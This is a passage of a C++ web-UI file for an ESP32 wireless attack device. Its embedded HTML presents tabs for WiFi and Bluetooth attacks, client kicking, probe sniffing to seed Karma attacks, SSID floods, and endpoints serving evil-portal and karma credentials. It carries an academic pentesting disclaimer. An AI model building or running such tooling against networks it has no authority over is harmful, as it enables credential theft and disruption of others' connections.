/**
 * web_ui.cpp — HTTP Web Server & User Interface
 * -----------------------------------------------
 * Serves the complete single-page web application over WiFi on port 80.
 * The entire UI (~150KB of HTML/CSS/JS) is stored in PROGMEM and streamed
 * to the client in chunks to avoid RAM allocation.
 *
 * Architecture:
 *   - ESP8266WebServer handles HTTP routing
 *   - All state is pushed from the INO loop via pushState()
 *   - Client polls /full_state every 2s for live updates
 *   - Commands arrive via POST /cmd and are queued for the main loop
 *   - PIN authentication stored in sessionStorage (client-side)
 *
 * Key endpoints:
 *   GET  /          — serves full SPA HTML
 *   GET  /full_state — JSON: device state, stats, scan results
 *   POST /cmd        — receives attack/scan commands
 *   GET  /wardrive_data, /pmkid_data, /karma_creds, /ep_creds, etc.
 *
 * Author: ESP32 Cyber Device Project
 */
#include "web_ui.h"
#include <esp_wifi.h>
#include "wifi_viewer.h"
#include "evil_portal.h"
#include "karma_attack.h"
#include "wifi_cracker.h"
#include <ArduinoJson.h>
extern EvilPortal evilPortal;
extern KarmaAttack karmaAttack;

static const char HTML1[] PROGMEM = R"~(
<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>ESP32 Cyber</title><style>
:root{
  --bg:#070b12;--panel:#0d1219;--panel2:#111820;
  --accent:#00c8ff;--green:#00e87a;--red:#ff3d5a;
  --yellow:#ffc830;--orange:#ff7a00;--purple:#a855f7;
  --blue:#3b82f6;
  --txt:#c8d4e8;--dim:#3d4f68;--border:#141e2e;
  --radius:12px;--shadow:0 4px 24px rgba(0,0,0,.4);
}
html.light{
  --bg:#f0f4f8;--panel:#ffffff;--panel2:#f8fafc;
  --txt:#1a2332;--dim:#7a8fa8;--border:#dde3ec;
  --shadow:0 4px 24px rgba(0,0,0,.08);
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:var(--bg);color:var(--txt);
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;
  transition:background .2s,color .2s}
/* -- header -- */
header{display:flex;align-items:center;justify-content:space-between;
  padding:0 20px;height:56px;background:var(--panel);
  border-bottom:1px solid var(--border);flex-shrink:0;
  box-shadow:0 1px 0 var(--border),0 4px 20px rgba(0,0,0,.3)}
.logo{color:var(--accent);font-size:1rem;letter-spacing:2px;font-weight:700}
.logo span{color:var(--green)}
.hdr-r{display:flex;align-items:center;gap:10px}
#dot{width:8px;height:8px;border-radius:50%;background:var(--dim);transition:all .3s}
#dot.on{background:var(--green);box-shadow:0 0 8px var(--green)}
#dot.off{background:var(--red);box-shadow:0 0 8px var(--red)}
#slabel{font-size:.75rem;color:var(--dim)}
/* -- nav tabs -- */
#nav{display:none;background:var(--panel);border-bottom:1px solid var(--border);
  padding:0 16px;overflow-x:auto;white-space:nowrap}
#nav.visible{display:flex}
.tab{display:inline-flex;align-items:center;gap:6px;padding:14px 18px;
  cursor:pointer;font-size:.78rem;color:var(--dim);border-bottom:2px solid transparent;
  transition:all .2s;letter-spacing:.3px;flex-shrink:0;font-weight:500}
.tab:hover{color:var(--txt);background:rgba(255,255,255,.02)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(0,200,255,.04)}
/* -- layout -- */
#app{width:100%;margin:0 auto;padding:16px}
.screen{display:none}.screen.active{display:block}
/* -- lock -- */
.lock-wrap{display:flex;flex-direction:column;align-items:center;padding-top:40px;width:100%;min-height:70vh;justify-content:flex-start}
.lock-icon{font-size:2.4rem;margin-bottom:8px}
.lock-title{color:var(--accent);font-size:1rem;letter-spacing:4px;margin-bottom:22px;text-align:center}
.pin-dots{display:flex;gap:16px;margin-bottom:26px;justify-content:center}
.pd{width:18px;height:18px;border-radius:50%;border:2px solid var(--dim);
  background:transparent;transition:all .2s}
.pd.f{background:var(--accent);border-color:var(--accent);box-shadow:0 0 10px rgba(0,212,255,.5)}
.pd.e{border-color:var(--red);animation:pds .3s}
@keyframes pds{0%,100%{transform:translateX(0)}30%{transform:translateX(-5px)}70%{transform:translateX(5px)}}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;max-width:280px;margin:0 auto}
.key{background:var(--panel2);border:1px solid var(--border);border-radius:10px;
  padding:17px 0;font-size:1.2rem;font-family:inherit;color:var(--txt);
  cursor:pointer;text-align:center;user-select:none;transition:all .1s}
.key:hover{background:#1a2535;border-color:var(--accent)}
.key:active{transform:scale(.92)}
.key.clr{color:var(--red);border-color:#2a1010}
.key.ok{background:#081a10;color:var(--green);border-color:var(--green)}
.lock-msg{margin-top:14px;font-size:.8rem;color:var(--dim);min-height:18px}
.lock-msg.err{color:var(--red)}
/* -- cards -- */
.card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);
  padding:18px;margin-bottom:12px;box-shadow:var(--shadow)}
.card-title{color:var(--accent);font-size:.72rem;letter-spacing:2px;font-weight:700;
  margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--border);
  text-transform:uppercase}
/* -- screen header -- */
.sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
.sh h2{color:var(--accent);font-size:.85rem;letter-spacing:2px}
.sh-btns{display:flex;gap:8px;flex-wrap:wrap}
.btn{border-radius:8px;padding:8px 16px;cursor:pointer;font-family:inherit;
  font-size:.8rem;border:1px solid;transition:all .15s;letter-spacing:.3px;
  font-weight:500}
.btn:hover{filter:brightness(1.15);transform:translateY(-1px)}
.btn:active{transform:scale(.97) translateY(0)}
.btn-back{background:transparent;border-color:var(--dim);color:var(--dim)}
.btn-back:hover{border-color:var(--txt);color:var(--txt)}
.btn-scan{background:rgba(0,232,122,.08);border-color:var(--green);color:var(--green)}
.btn-accent{background:rgba(0,200,255,.08);border-color:var(--accent);color:var(--accent)}
.btn-red{background:rgba(255,61,90,.08);border-color:var(--red);color:var(--red)}
.btn-orange{background:rgba(255,122,0,.08);border-color:var(--orange);color:var(--orange)}
/* -- stats bar -- */
.stats{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
.stat{background:var(--panel2);border:1px solid var(--border);border-radius:10px;
  padding:12px 14px;flex:1;min-width:70px;text-align:center;
  box-shadow:inset 0 1px 0 rgba(255,255,255,.04)}
.sv{font-size:1.4rem;font-weight:700;color:var(--accent)}
.sl{font-size:.62rem;color:var(--dim);margin-top:3px;letter-spacing:1px;text-transform:uppercase}
/* -- list items -- */
.net-list{display:flex;flex-direction:column;gap:6px;max-height:55vh;overflow-y:auto;padding-right:2px}
.ni{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;
  background:var(--panel2);border:1px solid var(--border);border-radius:10px;
  cursor:pointer;transition:all .15s}
.ni:hover{border-color:rgba(0,200,255,.4);background:rgba(0,200,255,.04)}
.ni.sel{border-color:var(--accent);background:rgba(0,200,255,.06);
  box-shadow:0 0 0 1px rgba(0,200,255,.2)}
.ni-name{font-size:.88rem;color:var(--txt)}
.ni-sub{font-size:.7rem;color:var(--dim);margin-top:3px}
.ni-r{display:flex;align-items:center;gap:8px;flex-shrink:0}
.badge{font-size:.62rem;padding:2px 6px;border-radius:4px;font-weight:bold}
.bo{background:var(--red);color:#fff}
.bw{background:#2a2000;color:var(--yellow);border:1px solid var(--yellow)}
.bs{background:#082010;color:var(--green);border:1px solid var(--green)}
.bp{background:#150826;color:var(--purple);border:1px solid var(--purple)}
.bars{display:flex;align-items:flex-end;gap:2px;height:16px}
.bars span{width:4px;border-radius:1px;background:var(--dim)}
.bars span.on{background:var(--green)}
/* -- detail card -- */
.dc{background:var(--bg);border:1px solid var(--accent);border-radius:var(--radius);
  padding:16px;margin-top:10px;display:none;box-shadow:0 0 20px rgba(0,212,255,.07)}
.dc.open{display:block}
.dc-title{color:var(--accent);font-size:.8rem;letter-spacing:2px;margin-bottom:12px}
.dr{display:flex;justify-content:space-between;align-items:center;
  padding:8px 0;border-bottom:1px solid var(--border);font-size:.83rem}
.dr:last-of-type{border-bottom:none}
.dl{color:var(--dim)}.dv{font-weight:bold;text-align:right;max-width:60%;word-break:break-all}
.btn-close{background:transparent;border:1px solid var(--dim);border-radius:7px;
  color:var(--dim);padding:5px 12px;cursor:pointer;font-family:inherit;font-size:.78rem;margin-top:12px}
.btn-close:hover{border-color:var(--txt);color:var(--txt)}
/* -- dashboard grid -- */
.dash-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:12px}
.dash-card{background:var(--panel2);border:1px solid var(--border);border-radius:var(--radius);
  padding:16px;cursor:pointer;transition:all .2s;
  box-shadow:inset 0 1px 0 rgba(255,255,255,.03)}
.dash-card:hover{border-color:rgba(0,200,255,.4);background:rgba(0,200,255,.04);
  transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,0,0,.3)}
.dash-icon{font-size:1.6rem;margin-bottom:6px}
.dash-val{font-size:1.4rem;font-weight:bold;color:var(--accent)}
.dash-label{font-size:.7rem;color:var(--dim);margin-top:2px;letter-spacing:1px}
/* -- channel chart -- */
.ch-bar-wrap{display:flex;align-items:flex-end;gap:4px;height:80px;margin:8px 0}
.ch-bar-col{display:flex;flex-direction:column;align-items:center;flex:1}
.ch-bar{width:100%;background:var(--accent);border-radius:3px 3px 0 0;
  transition:height .4s;min-height:2px}
.ch-bar.busy{background:var(--red)}
.ch-bar.free{background:var(--green)}
.ch-num{font-size:.6rem;color:var(--dim);margin-top:3px}
/* -- port scan -- */
.port-input-row{display:flex;gap:8px;margin-bottom:12px}
.port-input{background:var(--panel2);border:1px solid var(--border);border-radius:7px;

)~";

static const char HTML2[] PROGMEM = R"~(
  color:var(--txt);padding:8px 12px;font-family:inherit;font-size:.85rem;flex:1}
.port-input:focus{outline:none;border-color:var(--accent)}
.port-item{display:flex;justify-content:space-between;padding:8px 12px;
  background:var(--panel2);border:1px solid var(--border);border-radius:7px;margin-bottom:6px}
.port-num{color:var(--green);font-weight:bold}
.port-svc{color:var(--dim);font-size:.8rem}
/* -- scan/reboot -- */
.scan-wrap{text-align:center;padding:60px 20px}
.scan-icon{font-size:2.8rem;display:block;margin-bottom:18px;animation:pulse 1.1s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.9)}}
.scan-lbl{color:var(--green);font-size:.95rem;letter-spacing:2px;margin-bottom:6px}
.scan-sub{color:var(--dim);font-size:.78rem}
.rb-wrap{text-align:center;padding:48px 20px}
.rb-icon{font-size:3rem;display:block;margin-bottom:14px}
.rb-wrap h2{color:var(--red);font-size:1rem;letter-spacing:2px;margin-bottom:10px}
.rb-wrap p{color:var(--dim);font-size:.83rem;line-height:1.7;margin-bottom:24px}
.rb-btns{display:flex;justify-content:center;gap:12px;flex-wrap:wrap}
.btn-reboot{background:#1a0808;border:1px solid var(--red);border-radius:9px;
  color:var(--red);padding:13px 28px;font-family:inherit;font-size:.9rem;cursor:pointer}
.btn-reboot:hover{background:#2a0a0a;box-shadow:0 0 14px rgba(255,64,96,.3)}
.btn-cancel{background:transparent;border:1px solid var(--dim);border-radius:9px;
  color:var(--dim);padding:13px 28px;font-family:inherit;font-size:.9rem;cursor:pointer}
.btn-cancel:hover{border-color:var(--txt);color:var(--txt)}
/* -- empty state -- */
.empty{text-align:center;padding:32px 16px;color:var(--dim);font-size:.85rem;line-height:1.8}
.ei{font-size:2rem;display:block;margin-bottom:8px;opacity:.35}
/* -- settings rows -- */
.settings-row{display:flex;justify-content:space-between;align-items:center;
  padding:10px 0;border-bottom:1px solid var(--border);font-size:.83rem}
.settings-row:last-child{border-bottom:none}
.sk{color:var(--dim)}.sv2{font-weight:bold}
/* -- scrollbar -- */
::-webkit-scrollbar{width:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
</style></head><body>
<header>
  <div class="logo">ESP32&#9889;<span>CYBER</span></div>
  <div class="hdr-r"><button onclick="toggleTheme()" id="theme-btn" style="background:none;border:1px solid var(--border);border-radius:8px;cursor:pointer;font-size:1rem;color:var(--dim);padding:4px 8px" title="Toggle theme">&#9790;</button><span id="dot"></span><span id="slabel">connecting...</span></div>
</header>
<div id="nav">
  <div class="tab active" id="t-dash"     onclick="navTo('dash')">&#127968; Home</div>
  <div class="tab"        id="t-wifi"     onclick="navTo('wifi')">&#x1F4F6; WiFi</div>
  <div class="tab"        id="t-ble"      onclick="navTo('ble')">&#x1F4F7; BLE</div>
  <div class="tab"        id="t-net"      onclick="navTo('net')">&#x1F5A7; Network</div>
  <div class="tab"        id="t-tools"    onclick="navTo('tools')">&#128295; Tools</div>
  <div class="tab"        id="t-watk"     onclick="navTo('watk')">&#128225; WiFi Attacks</div>
  <div class="tab"        id="t-batk"     onclick="navTo('batk')">&#128241; BT Attacks</div>
  <div class="tab"        id="t-wardrive" onclick="navTo('wardrive')">&#128205; Wardrive</div>
  <div class="tab"        id="t-defend"   onclick="navTo('defend')">&#128737; Defence</div>
  <div class="tab"        id="t-logs"     onclick="navTo('logs')">&#128196; Logs</div>
  <div class="tab"        id="t-settings" onclick="navTo('settings')">&#9881; Settings</div>
</div>
<div id="app">

<!-- DISCLAIMER - shown on first ever visit -->
<div class="screen" id="s-disclaimer">
  <div style="max-width:420px;margin:0 auto;padding:16px">
    <div style="text-align:center;margin-bottom:20px">
      <div style="font-size:3rem">&#9888;&#65039;</div>
      <div style="color:var(--red);font-size:1.1rem;font-weight:700;letter-spacing:1px;margin-top:8px">LEGAL WARNING</div>
    </div>
    <div class="card" style="border:1px solid var(--red)">
      <div style="color:var(--txt);font-size:.85rem;line-height:1.7;margin-bottom:16px">
        This device is designed <strong>exclusively for authorised penetration testing, 
        security research, and educational purposes.</strong>
      </div>
      <div style="color:var(--txt);font-size:.85rem;line-height:1.7;margin-bottom:16px">
        Unauthorised use against networks or devices you do not own or have 
        <strong>explicit written permission</strong> to test is illegal under:
      </div>
      <div style="color:var(--dim);font-size:.8rem;line-height:1.8;margin-bottom:16px;padding:10px;background:var(--panel2);border-radius:8px">
        &#x2022; Computer Misuse Act 1990 (UK)<br>
        &#x2022; Computer Fraud and Abuse Act (US)<br>
        &#x2022; EU Directive on Attacks Against Information Systems<br>
        &#x2022; General Data Protection Regulation (GDPR)
      </div>
      <div style="color:var(--yellow);font-size:.82rem;line-height:1.6;margin-bottom:20px">
        By proceeding you confirm that you are a security professional or student 
        acting within the law, and that you accept full legal responsibility for 
        your use of this device.
      </div>
      <button onclick="agreeDisclaimer()" 
        style="width:100%;padding:14px;background:var(--red);color:#fff;border:none;
               border-radius:10px;font-size:.95rem;font-weight:700;cursor:pointer;
               letter-spacing:.5px">
        &#9989; I UNDERSTAND &amp; AGREE
      </button>
      <div style="color:var(--dim);font-size:.72rem;text-align:center;margin-top:10px">
        Built for academic research — MSc/BSc Cybersecurity Project
      </div>
    </div>
  </div>
</div>

<!-- LOCK -->
<div class="screen" id="s-lock" style="display:none"></div><!-- pin removed -->

<div class="screen" id="s-dash">
  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px">
    <div style="color:var(--accent);font-size:.85rem;font-weight:700;letter-spacing:2px">DASHBOARD</div>
    <div style="display:flex;align-items:center;gap:10px">
      <button id="demo-btn" onclick="runDemo()" style="background:none;border:1px solid var(--yellow);color:var(--yellow);border-radius:8px;padding:5px 12px;font-size:.75rem;cursor:pointer;font-family:inherit">&#9654; DEMO MODE</button>
      <div style="color:var(--dim);font-size:.72rem" id="dash-time">--:--:--</div>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="sv" id="d-nets">--</div><div class="sl">NETWORKS</div></div>
    <div class="stat"><div class="sv" id="d-clients">--</div><div class="sl">CLIENTS</div></div>
    <div class="stat"><div class="sv" id="d-ch">--</div><div class="sl">BEST CH</div></div>
    <div class="stat"><div class="sv" id="d-uptime">0s</div><div class="sl">UPTIME</div></div>
  </div>
  <div id="dash-active" style="display:none;background:rgba(255,61,90,.06);border:1px solid var(--red);border-radius:10px;padding:12px 16px;margin-bottom:12px;font-size:.8rem">
    <div style="color:var(--red);font-weight:700;margin-bottom:6px">&#9889; ACTIVE ATTACKS</div>
    <div id="dash-active-list" style="color:var(--txt);font-size:.78rem"></div>
  </div>
  <div style="color:var(--dim);font-size:.72rem;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px">Quick Launch</div>
  <div class="dash-grid">
    <div class="dash-card" onclick="navTo('wifi')"><div class="dash-icon">&#x1F4F6;</div><div class="dash-val" id="d-wifi-cnt">--</div><div class="dash-label">WiFi Scan</div></div>
    <div class="dash-card" onclick="navTo('ble')"><div class="dash-icon">&#x1F4F7;</div><div class="dash-val" id="d-ble-cnt">--</div><div class="dash-label">BLE Scan</div></div>
    <div class="dash-card" onclick="navTo('watk')"><div class="dash-icon">&#128225;</div><div class="dash-val">ATK</div><div class="dash-label">WiFi Attacks</div></div>
    <div class="dash-card" onclick="navTo('batk')"><div class="dash-icon">&#128241;</div><div class="dash-val">BLE</div><div class="dash-label">BT Attacks</div></div>
    <div class="dash-card" onclick="navTo('defend')"><div class="dash-icon">&#128737;</div><div class="dash-val">DEF</div><div class="dash-label">Defence</div></div>
    <div class="dash-card" onclick="navTo('logs')"><div class="dash-icon">&#128196;</div><div class="dash-val" id="d-log-cnt">0</div><div class="dash-label">Log Events</div></div>
  </div>
  <div class="card" style="margin-top:4px">
    <div style="display:flex;justify-content:space-between;font-size:.78rem;margin-bottom:6px">
      <span style="color:var(--dim)">AP IP</span>
      <span style="color:var(--accent);font-weight:600" id="d-ip">192.168.4.1</span>
    </div>
    <div style="display:flex;justify-content:space-between;font-size:.78rem;margin-bottom:12px">
      <span style="color:var(--dim)">Free Heap</span>
      <span style="color:var(--green)" id="d-heap">--</span>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <button class="btn btn-scan" onclick="doCmd('scan_wifi')" style="flex:1">&#x1F4F6; WiFi Scan</button>
      <button class="btn btn-accent" onclick="doCmd('scan_ble')" style="flex:1">&#x1F4F7; BLE Scan</button>
    </div>
    <button class="btn" onclick="runDemo()" style="width:100%;margin-top:8px;background:rgba(168,85,247,.08);border-color:var(--purple);color:var(--purple)">&#127911; Run Demo Mode</button>
  </div>
</div>

<!-- WIFI -->
<div class="screen" id="s-wifi">
  <div class="sh">
    <h2>&#x1F4F6; WIFI NETWORKS</h2>
    <div class="sh-btns">
      <button class="btn btn-scan" onclick="doCmd('scan_wifi')">&#9654; Rescan</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="sv" id="w-tot">--</div><div class="sl">FOUND</div></div>
    <div class="stat"><div class="sv" id="w-str">--</div><div class="sl">STRONG</div></div>
    <div class="stat"><div class="sv" id="w-opn">--</div><div class="sl">OPEN</div></div>
    <div class="stat"><div class="sv" id="w-ch">--</div><div class="sl">CHANNELS</div></div>
  </div>
  <div id="wifi-list" class="net-list">
    <div class="empty"><span class="ei">&#x1F4F6;</span>Press Rescan to discover networks</div>
  </div>
  <div class="dc" id="wifi-dc">
    <div class="dc-title">&#x1F4F6; NETWORK DETAIL</div>
    <div class="dr"><span class="dl">SSID</span>     <span class="dv" id="d-ssid"></span></div>
    <div class="dr"><span class="dl">RSSI</span>     <span class="dv" id="d-rssi"></span></div>
    <div class="dr"><span class="dl">Security</span><span class="dv" id="d-enc"></span></div>
    <div class="dr"><span class="dl">Channel</span> <span class="dv" id="d-chan"></span></div>
    <div class="dr"><span class="dl">Quality</span> <span class="dv" id="d-qual"></span></div>
    <button class="btn-close" onclick="closeWD()">&#10005; Close</button>
  </div>
</div>

<!-- BLE -->
<div class="screen" id="s-ble">
  <div class="sh">
    <h2>&#x1F4F7; BLUETOOTH BLE</h2>
    <div class="sh-btns">
      <button class="btn btn-scan" onclick="doCmd('scan_ble')">&#9654; Rescan</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="sv" id="b-tot">--</div><div class="sl">DEVICES</div></div>
    <div class="stat"><div class="sv" id="b-named">--</div><div class="sl">NAMED</div></div>
    <div class="stat"><div class="sv" id="b-close">--</div><div class="sl">CLOSE</div></div>
  </div>
  <div id="ble-list" class="net-list">
    <div class="empty"><span class="ei">
)~";

static const char HTML3[] PROGMEM = R"~(
&#x1F4F7;</span>Press Rescan to discover BLE devices</div>
  </div>
  <div class="dc" id="ble-dc">
    <div class="dc-title">&#x1F4F7; DEVICE DETAIL</div>
    <div class="dr"><span class="dl">Name</span>     <span class="dv" id="d-bname"></span></div>
    <div class="dr"><span class="dl">Address</span> <span class="dv" id="d-baddr"></span></div>
    <div class="dr"><span class="dl">RSSI</span>    <span class="dv" id="d-brssi"></span></div>
    <div class="dr"><span class="dl">Proximity</span><span class="dv" id="d-bprox"></span></div>
    <button class="btn-close" onclick="closeBD()">&#10005; Close</button>
  </div>
</div>

<!-- NETWORK -->
<div class="screen" id="s-net">
  <div class="sh">
    <h2>&#x1F5A7; CONNECTED CLIENTS</h2>
    <div class="sh-btns">
      <button class="btn btn-scan" onclick="doCmd('scan_net')">&#9654; Refresh</button>
    </div>
  </div>
  <div class="stats">
    <div class="stat"><div class="sv" id="n-tot">--</div><div class="sl">CLIENTS</div></div>
    <div class="stat"><div class="sv" style="color:var(--green);font-size:.75rem">192.168.4.x</div><div class="sl">SUBNET</div></div>
  </div>
  <div id="net-map" style="display:none;margin-bottom:12px">
    <svg id="net-svg" width="100%" height="220" style="background:var(--panel2);border-radius:8px;border:1px solid var(--border)"></svg>
  </div>
  <div style="margin-bottom:8px">
    <button class="btn" id="netmap-btn" onclick="toggleNetMap()" style="border-color:var(--accent);color:var(--accent);font-size:.78rem">&#128506; Show Map</button>
  </div>
  <div id="net-list" class="net-list">
    <div class="empty"><span class="ei">&#x1F5A7;</span>Connect a device to ESP32-Cyber<br>then press Refresh</div>
  </div>
</div>

<!-- TOOLS -->
<div class="screen" id="s-tools">
  <div class="sh"><h2>&#128295; TOOLS</h2></div>

  <!-- AP MANAGER -->
  <div class="card">
    <div class="card-title">&#128246; AP MANAGER</div>
    <div class="stats">
      <div class="stat"><div class="sv" id="ap-cnt">--</div><div class="sl">CLIENTS</div></div>
    </div>
    <div id="ap-list" style="margin-bottom:10px">
      <div class="empty" style="padding:12px;color:var(--dim)">Press Refresh to see connected clients</div>
    </div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <button class="btn btn-scan" onclick="doCmd('ap_refresh')">&#9654; Refresh</button>
      <button class="btn btn-red" onclick="confirmKick()">&#128465; Kick All</button>
    </div>
  </div>

  <!-- PORT SCANNER -->
  <div class="card">
    <div class="card-title">&#128270; PORT SCANNER</div>
    <div class="port-input-row">
      <input class="port-input" id="port-target" type="text" placeholder="Target IP e.g. 192.168.4.2" value="192.168.4.2"/>
      <button class="btn btn-orange" onclick="startPortScan()">&#128269; Scan</button>
    </div>
    <div id="port-results">
      <div class="empty" style="padding:12px;color:var(--dim)">Enter an IP and press Scan</div>
    </div>
  </div>

  <!-- CHANNEL ANALYSER -->
  <div class="card">
    <div class="card-title">&#128268; CHANNEL ANALYSER</div>
    <div id="ch-note" style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Run WiFi scan first to populate</div>
    <div class="ch-bar-wrap" id="ch-bars"></div>
    <div style="display:flex;justify-content:space-between;margin-top:8px;font-size:.78rem">
      <span style="color:var(--dim)">Best: <span id="ch-best" style="color:var(--green);font-weight:bold">--</span></span>
      <span style="color:var(--dim)">Busiest: <span id="ch-busy" style="color:var(--red);font-weight:bold">--</span></span>
    </div>
    <button class="btn btn-scan" style="margin-top:10px;width:100%" onclick="doCmd('scan_wifi')">&#9654; Refresh</button>
  </div>

  <!-- MAC LOOKUP -->
  <div class="card">
    <div class="card-title">&#128268; MAC VENDOR LOOKUP</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Identify device manufacturer from MAC address</div>
    <div class="port-input-row">
      <input class="port-input" id="mac-input" type="text" placeholder="e.g. AA:BB:CC:DD:EE:FF" maxlength="17"/>
      <button class="btn btn-accent" onclick="lookupMAC()">&#128269; Lookup</button>
    </div>
    <div id="mac-result" style="font-size:.82rem;color:var(--txt);padding:8px 0;display:none"></div>
  </div>

  <!-- PING TOOL -->
  <div class="card">
    <div class="card-title">&#128214; PING / HOST CHECK</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Check if a host is reachable on the network</div>
    <div class="port-input-row">
      <input class="port-input" id="ping-target" type="text" placeholder="IP or hostname"/>
      <button class="btn btn-accent" onclick="doPing()">&#9654; Ping</button>
    </div>
    <div id="ping-result" style="font-size:.82rem;margin-top:6px;display:none"></div>
  </div>

  <!-- PACKET COUNTER -->
  <div class="card">
    <div class="card-title">&#128200; LIVE PACKET COUNTER</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Counts 802.11 frames by type on the current channel in real time</div>
    <div class="stats" id="pkt-stats">
      <div class="stat"><div class="sv" id="pkt-mgmt">0</div><div class="sl">MGMT</div></div>
      <div class="stat"><div class="sv" id="pkt-data">0</div><div class="sl">DATA</div></div>
      <div class="stat"><div class="sv" id="pkt-ctrl">0</div><div class="sl">CTRL</div></div>
      <div class="stat"><div class="sv" id="pkt-total">0</div><div class="sl">TOTAL</div></div>
    </div>
    <div style="display:flex;gap:8px">
      <button class="btn btn-scan" id="pkt-btn" onclick="togglePacketCount()">&#9654; Start</button>
      <span id="pkt-status" style="color:var(--dim);font-size:.78rem;align-self:center"></span>
    </div>
  </div>
  <!-- RSSI Signal Meter -->
  <div class="card">
    <div class="card-title">&#128268; RSSI SIGNAL METER</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Track live signal strength of any nearby network. Run WiFi scan first then select one.</div>
    <div style="display:flex;gap:8px;margin-bottom:12px">
      <select id="rssi-sel" style="background:var(--panel2);border:1px solid var(--border);color:var(--txt);border-radius:8px;padding:8px;flex:1;font-family:inherit;font-size:.82rem"><option value="">-- Scan WiFi first --</option></select>
      <button class="btn btn-accent" id="rssi-btn" onclick="toggleRSSIMeter()">&#9654; Track</button>
    </div>
    <div id="rssi-bar-wrap" style="display:none">
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:6px">
        <div style="flex:1;background:var(--panel2);border-radius:8px;height:28px;overflow:hidden;border:1px solid var(--border)">
          <div id="rssi-bar" style="height:100%;width:0%;background:var(--green);border-radius:8px;transition:width .4s,background .4s"></div>
        </div>
        <span id="rssi-val" style="color:var(--accent);font-weight:700;min-width:65px;text-align:right">-- dBm</span>
      </div>
      <div style="font-size:.7rem;color:var(--dim);display:flex;justify-content:space-between"><span>Weak</span><span>Strong</span></div>
    </div>
  </div>

  <!-- WiFi Join -->
  <div class="card">
    <div class="card-title">&#127760; JOIN WIFI NETWORK</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Connect ESP32 to a network. Required for Chromecast attack and internet access.</div>
    <div style="display:flex;flex-direction:column;gap:8px">
      <input id="join-ssid" class="port-input" type="text" placeholder="Network SSID"/>
      <input id="join-pass" class="port-input" type="password" placeholder="Password (leave blank for open)"/>
      <button class="btn btn-scan" onclick="joinWifi()">&#128279; Connect</button>
      <span id="join-status" style="color:var(--dim);font-size:.75rem"></span>
    </div>
  </div>

  <!-- Station Scanner card -->
  <div class="card">
    <div class="card-title" style="color:var(--blue)">&#128101; STATION SCANNER</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Passively sniffs 802.11 data frames to discover client devices and which AP they are connected to. Marauder-style client enumeration.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
      <button class="btn" id="sta-btn" style="border-color:var(--blue);color:var(--blue)" onclick="toggleStationScan()">&#9654; Start</button>
      <span id="sta-status" style="color:var(--dim);font-size:.75rem"></span>
    </div>
    <div id="sta-list" style="max-height:220px;overflow-y:auto;font-size:.72rem">
      <div style="color:var(--dim);padding:8px">No stations found yet...</div>
    </div>
  </div>

  <!-- Probe Sniffer card -->
  <div class="card">
    <div class="card-title" style="color:var(--yellow)">&#128268; PROBE SNIFFER</div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:8px">Captures probe requests — reveals which WiFi networks nearby devices remember. Perfect seed for Karma attack targets.</div>
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
      <button class="btn" id="probe-btn" style="border-color:var(--yellow);color:var(--yellow)" onclick="toggleProbeScan()">&#9654; Start</button>
      <span id="probe-status" style="color:var(--dim);font-size:.75rem"></span>
    </div>
    <div id="probe-list" style="max-height:220px;overflow-y:auto;font-size:.72rem">
      <div style="color:var(--dim);padding:8px">No probes captured yet...</div>
    </div>
  </div>

</div>
<!-- WIFI ATTACKS -->
<div class="screen" id="s-watk">
  <div class="sh"><h2>&#128225; WIFI ATTACKS</h2></div>

  <!-- Troll Tools -->
  <div class="card">
    <div class="card-title" style="color:var(--purple)">&#128514; TROLL TOOLS <span style="color:var(--green);font-size:.7rem;font-weight:normal">(works)</span></div>
    <div style="color:var(--dim);font-size:.78rem;margin-bottom:10px">Pre-loaded fun SSID floods. No config needed -- just press and go.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap">
      <button class="btn" id="troll-fbi-btn" onclick="toggleFBIVan()" style="border-color:var(--purple);color:var(--purple)">&#128514; FBI Van Classics</button>
      <button class="btn" id="troll-apoc-btn" onclick="toggleApocalypse()" style="border-color:var(--red);color:var(--red)">&#128165; Network Apocalypse</button>
      <button class="btn" onclick="stopTrollTools()" style="border-color:var(--dim);color:var(--dim)">&#9632; Stop Both</button>
    </div>
    <div style="color:var(--dim);font-size:.7rem;margin-top:8px">
      <b style="color:var(--purple)">FBI Van</b> floods local WiFi lists with "FBI Surveillance Van #3", "Abraham Linksys" etc.<br>
